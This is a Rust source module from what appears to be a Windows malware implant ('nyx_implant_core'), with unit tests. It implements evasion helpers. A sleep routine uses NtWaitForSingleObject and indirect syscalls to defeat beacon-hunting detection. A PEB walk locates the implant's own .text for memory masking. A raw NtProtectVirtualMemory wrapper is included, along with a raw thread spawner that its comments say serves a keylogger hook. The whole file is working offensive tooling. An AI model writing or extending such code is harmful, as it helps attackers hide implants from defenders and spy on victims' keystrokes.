//! Sleep obfuscation helpers — the floor sleep plus the raw primitives the
//! Fluctuation sleep mask and other modules build on.
//!
//! ## Status
//! The Foliage APC→NtContinue executor that used to live here was deliberately
//! removed (commit 841ffc5), superseded by the Fluctuation sleep mask
//! (`crate::fluctuation`) — the shipped sleep obfuscation. What remains in
//! this module is all live code:
//!   - [`sleep_seconds`] — the plain floor sleep (`NtWaitForSingleObject` with
//!     a UserRequest wait-reason), used when Fluctuation is disabled or the
//!     evasion init did not run.
//!   - [`own_text_region`] / `section_va_len` — locate the implant's own
//!     `.text` (consumed by `fluctuation`, `evasion_glue`, and selftests).
//!   - [`raw_create_thread`] — spawn a thread on raw exports, bypassing the
//!     shared indirect-syscall trampoline (used by the keylog hook thread).
//!   - [`FoliageRaw`] — raw NtProtectVirtualMemory pointer used by
//!     `mem::mask_text_and_heap` / `mem::unmask_text_and_heap` (dormant,
//!     pending wiring).

#![cfg(target_os = "windows")]

/// Sleep N seconds via `NtWaitForSingleObject(INVALID_HANDLE_VALUE, Alertable=FALSE,
/// &interval)`. This gives wait-reason `UserRequest` instead of `DelayExecution`,
/// defeating Hunt-Sleeping-Beacons heuristics. Falls back to the resolved export
/// if the indirect-syscall runtime is not yet up, then to NtDelayExecution as a
/// last resort.
///
/// Lives here (not in `beacon`) since WP-C 断环第一刀: `fluctuation` (evasion
/// side) needs the floor sleep without depending on the beacon task loop.
pub fn sleep_seconds(seconds: u32) {
    type NtWaitForSingleObject = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
    type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;
    let delay_100ns: i64 = -(seconds as i64).saturating_mul(10_000_000); // relative, 100ns units
    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
    // Prefer the indirect-syscall runtime (RIP lands in ntdll). This is the
    // canonical "runtime is live" path now that entry initializes it.
    if let Some(rt) = nyx_implant_core::syscalls::global() {
        let called = unsafe {
            nyx_implant_core::syscalls::nt_wait_for_single_object(
                rt,
                INVALID_HANDLE, // INVALID_HANDLE_VALUE → UserRequest wait-reason
                0,              // not alertable (floor sleep)
                &delay_100ns as *const i64 as usize,
            )
        };
        if called.is_some() {
            return;
        }
    }
    // Fall back to the resolved NtWaitForSingleObject export (pre-runtime path,
    // or if indirect runtime init failed). Still gives UserRequest wait-reason.
    if let Some(addr) =
        unsafe { nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject") }
    {
        let f: NtWaitForSingleObject = unsafe { core::mem::transmute(addr) };
        unsafe { f(INVALID_HANDLE, 0, &delay_100ns as *const i64) };
        return;
    }
    // Last resort: NtDelayExecution (wait-reason will be DelayExecution, but
    // at least we still sleep). Only reached if NtWaitForSingleObject is absent.
    if let Some(addr) =
        unsafe { nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution") }
    {
        let f: NtDelayExecution = unsafe { core::mem::transmute(addr) };
        unsafe { f(0, &delay_100ns as *const i64) };
        return;
    }
    // Should not happen on a real host, but never infinite-spin.
    let spins = seconds.min(60) as u64 * 10_000_000;
    for _ in 0..spins {
        core::hint::spin_loop();
    }
}

/// The implant's own `.text` region (base + len). Used by the Fluctuation
/// sleep mask and the `MemoryMaskKit` live impl. Reading PEB->ImageBaseAddress is correct
/// for both rundll32 and reflective-loaded implants.
/// `pub` (WP-C crate split): returned across the crate boundary by
/// [`own_text_region`] (the shell's `selftests` module consumes it).
pub struct TextRegion {
    pub base: usize,
    pub len: usize,
}

/// The implant's own `.text` region (base + len). Walks the PEB LDR list to
/// find the module that contains `own_text_region`'s own address — this works
/// correctly for DLL-loaded implants (rundll32.exe), unlike the PEB->ImageBaseAddress
/// approach which returns the host EXE's base.
///
/// Returns None only if the PEB/PE headers are unreadable (shouldn't happen).
///
/// `pub` (WP-C crate split): the shell's `selftests` module calls it across
/// the crate boundary (as do `fluctuation` / `evasion_glue` in-crate).
///
/// # Safety
/// PEB + PE header reads are stable post-load. Single-threaded context.
pub unsafe fn own_text_region() -> Option<TextRegion> {
    let our_addr = own_text_region as *const () as usize;
    let peb = nyx_implant_core::resolve::peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut guard = 0u32;
    while head as *const u8 != list_start && guard < 256 {
        guard += 1;
        let entry: *mut nyx_implant_core::resolve::ListEntry = head;
        let base = (*entry).dll_base as usize;
        let size = (*entry).size_of_image as usize;
        if base != 0 && our_addr >= base && our_addr < base + size {
            let (text_rva, text_size) = section_va_len(base, b".text")?;
            return Some(TextRegion {
                base: base + text_rva,
                len: text_size,
            });
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Raw NtProtectVirtualMemory export pointer, resolved once on the beacon
/// thread and called directly (bypassing the shared indirect-syscall
/// trampoline). Consumed by `mem::mask_text_and_heap` /
/// `mem::unmask_text_and_heap` (dormant, pending Fluctuation wiring).
///
/// Only `nt_protect` remains after the Foliage APC chain was removed (commit
/// 841ffc5); the struct name is kept to avoid churn in `mem.rs`.
#[derive(Clone, Copy)]
pub struct FoliageRaw {
    nt_protect: usize,
}

impl FoliageRaw {
    /// Raw NtProtectVirtualMemory(ProcessHandle=-1, BaseAddress*, RegionSize*,
    /// NewProtection, OldProtection*). Returns the NTSTATUS.
    ///
    /// # Safety
    /// `base`/`size`/`old` must be valid mutable pointers.
    pub(crate) unsafe fn nt_protect_virtual_memory(
        &self,
        base: &mut usize,
        size: &mut usize,
        new_prot: u32,
        old: &mut u32,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
        unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
    }
}

/// Raw kernel32!CreateThread → spawn `entry(param)`. Returns the thread handle
/// or None on failure.
///
/// # Safety
/// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
/// entry on a new thread.
/// Spawn a raw Win32 thread (kernel32!CreateThread) that runs entirely on raw
/// exports — bypassing the shared indirect-syscall trampoline (`syscalls::global()`).
///
/// `pub` (WP-C crate split) so the shell's keylog hook thread (P2) can reuse
/// this across the crate boundary without duplicating the CreateThread
/// resolution. Returns the thread handle (owned by the caller; Close via
/// `NtClose`).
pub unsafe fn raw_create_thread(
    entry: unsafe extern "system" fn(usize) -> u32,
    param: usize,
) -> Option<usize> {
    let addr = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
    type Fn = unsafe extern "system" fn(
        *mut core::ffi::c_void,                          // lpThreadAttributes
        usize,                                           // dwStackSize
        Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
        usize,                                           // lpParameter
        u32,                                             // dwCreationFlags
        *mut u32,                                        // lpThreadId
    ) -> *mut core::ffi::c_void;
    let f: Fn = unsafe { core::mem::transmute(addr) };
    let h = unsafe {
        f(
            core::ptr::null_mut(),
            0,
            Some(entry),
            param,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        None
    } else {
        Some(h as usize)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal synthetic PE image (as `section_va_len` parses it):
    /// DOS header with MZ + e_lfanew, NT signature "PE\0\0", file header
    /// fields (num_sections / size_of_optional_header) and `sections`
    /// 40-byte IMAGE_SECTION_HEADER entries (name, vsize, vaddr).
    fn fake_pe(sections: &[(&[u8; 8], u32, u32)]) -> std::vec::Vec<u8> {
        const E_LFANEW: usize = 0x80;
        const SIZE_OPT: usize = 0xF0;
        let sec_off = E_LFANEW + 24 + SIZE_OPT;
        let mut buf = std::vec![0u8; sec_off + sections.len() * 40 + 64];
        buf[0] = b'M';
        buf[1] = b'Z';
        buf[60..64].copy_from_slice(&(E_LFANEW as i32).to_le_bytes());
        let nt = E_LFANEW;
        buf[nt] = b'P';
        buf[nt + 1] = b'E';
        buf[nt + 6..nt + 8].copy_from_slice(&(sections.len() as u16).to_le_bytes());
        buf[nt + 20..nt + 22].copy_from_slice(&(SIZE_OPT as u16).to_le_bytes());
        for (i, (name, vsize, vaddr)) in sections.iter().enumerate() {
            let s = sec_off + i * 40;
            buf[s..s + 8].copy_from_slice(*name);
            buf[s + 8..s + 12].copy_from_slice(&vsize.to_le_bytes());
            buf[s + 12..s + 16].copy_from_slice(&vaddr.to_le_bytes());
        }
        buf
    }

    #[test]
    fn section_va_len_finds_text() {
        let pe = fake_pe(&[
            (b".text\0\0\0", 0x2000, 0x1000),
            (b".rdata\0\0", 0x800, 0x3000),
        ]);
        let got = unsafe { section_va_len(pe.as_ptr() as usize, b".text") };
        assert_eq!(got, Some((0x1000, 0x2000)));
        let got = unsafe { section_va_len(pe.as_ptr() as usize, b".rdata") };
        assert_eq!(got, Some((0x3000, 0x800)));
    }

    #[test]
    fn section_va_len_rejects_bad_headers() {
        let mut pe = fake_pe(&[(b".text\0\0\0", 0x2000, 0x1000)]);
        // Bad MZ magic.
        pe[0] = b'X';
        assert_eq!(
            unsafe { section_va_len(pe.as_ptr() as usize, b".text") },
            None
        );
        // Restore MZ, break the PE signature.
        pe[0] = b'M';
        pe[0x80] = b'X';
        assert_eq!(
            unsafe { section_va_len(pe.as_ptr() as usize, b".text") },
            None
        );
    }

    #[test]
    fn section_va_len_missing_section_returns_none() {
        let pe = fake_pe(&[(b".text\0\0\0", 0x2000, 0x1000)]);
        assert_eq!(
            unsafe { section_va_len(pe.as_ptr() as usize, b".pdata") },
            None
        );
    }

    /// Real PEB-walk integration: the test binary's own .text must be found
    /// and contain this function's address.
    #[test]
    fn own_text_region_contains_self() {
        let region = unsafe { own_text_region() }.expect("own .text region must resolve");
        assert!(region.len > 0);
        let f = own_text_region as *const () as usize;
        assert!(
            f >= region.base && f < region.base + region.len,
            "own_text_region ({:#x}) outside reported .text [{:#x}, {:#x})",
            f,
            region.base,
            region.base + region.len
        );
    }

    /// Resolution-chain smoke: a zero-second sleep must return promptly via
    /// the NtWaitForSingleObject export path (indirect runtime is not
    /// initialized in a test process).
    #[test]
    fn sleep_seconds_zero_returns_promptly() {
        let start = std::time::Instant::now();
        sleep_seconds(0);
        assert!(start.elapsed() < std::time::Duration::from_secs(2));
    }
}
